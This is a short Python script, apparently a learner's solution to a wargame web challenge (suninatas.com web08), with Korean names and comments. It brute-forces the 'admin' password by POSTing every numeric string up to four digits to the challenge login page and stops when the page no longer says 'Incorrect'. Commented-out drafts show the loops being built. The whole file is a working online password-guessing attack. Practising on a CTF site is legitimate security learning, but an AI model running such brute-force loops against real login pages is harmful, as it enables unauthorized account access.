import requests
import itertools

문자열 = '0123456789'  # 특수 문자는 없다고 가정한다

for 패스워드길이 in range(1, 5):  # 1 - 1~3에서 1~5까지 해볼 것
    for password in itertools.product(문자열, repeat=패스워드길이):
        # print(password)  # 1
        # print(''.join(password))
        pw = ''.join(password)
        print(pw)
        로그인패킷 = {
            'id': 'admin',
            'pw': pw,
        }
        address = requests.post('http://suninatas.com/challenge/web08/web08.asp', data=로그인패킷)
        if address.text.find('Incorrect') == -1:
            exit()

# for i in range(10):
    # address = requests.get(f'http://127.0.0.1:8080/?id=hojun&pw={i}')
    

# 문자열 = '0123456789'

# for 패스워드길이 in range(1,5):
#     for password in itertools.product(문자열, repeat=패스워드길이):
#         # print(password)
#         print(''.join(password))

# for i in 문자열:
#     for j in 문자열:
#         print(i,j)

# for i in 문자열:
#     for j in 문자열:
#         for k in 문자열:
#             print(i, j, k)

